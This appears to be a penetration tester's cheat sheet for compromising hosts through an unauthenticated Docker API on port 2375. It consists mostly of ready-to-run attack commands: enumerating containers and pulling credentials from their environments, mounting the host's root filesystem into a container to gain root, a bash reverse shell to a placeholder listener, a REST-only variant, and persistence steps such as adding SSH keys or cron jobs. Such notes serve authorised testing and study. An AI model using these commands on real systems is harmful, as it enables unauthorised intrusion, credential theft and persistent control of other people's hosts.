# Docker API

## Before I start
- [ ] 2375 open: the API with no TLS and, usually, no login
curl -s http://<TargetIP>:2375/version | jq

## Look around
The docker client, after sudo apt install -y docker-cli:
export DOCKER_HOST=tcp://<TargetIP>:2375
docker ps
docker images
docker inspect THE-CONTAINER
docker logs THE-CONTAINER
- [ ] inspect prints each container's environment: database passwords, API keys and cloud credentials, read before anything else

## Root on the host
The host's disk mounted into a new container:
docker -H tcp://<TargetIP>:2375 run --rm -v /:/host -it alpine chroot /host bash
A reverse shell instead, with the listener up first:
rlwrap nc -lvnp <LPORT>
docker -H tcp://<TargetIP>:2375 run --rm -v /:/host alpine sh -c 'chroot /host bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'
- [ ] Root on the host's files: /etc/shadow, a key added to /root/.ssh/authorized_keys, a cron job
- [ ] The target cannot pull alpine: an image it already has, from docker images, in its place

## Without the docker client
curl -s http://<TargetIP>:2375/images/json
- [ ] The same through REST: POST /containers/create with HostConfig.Binds set to ["/:/host"], then POST /containers/THE-ID/start

## If it fails
- [ ] 2376 with TLS client certificates: the CA and a client certificate are needed, from the host or from a repository
- [ ] The version answers but docker ps gets 401: an authorisation plugin, so another way in first

## Related
- [ ] Already on the host, in the docker group: the same escape locally, :Pb docker-lxd
- [ ] A cluster's API exposed as well: :Pb kubernetes

## Next
- [ ] Root on the host: :Pb linux-creds
- [ ] Cloud credentials from an environment: the cloud account they open
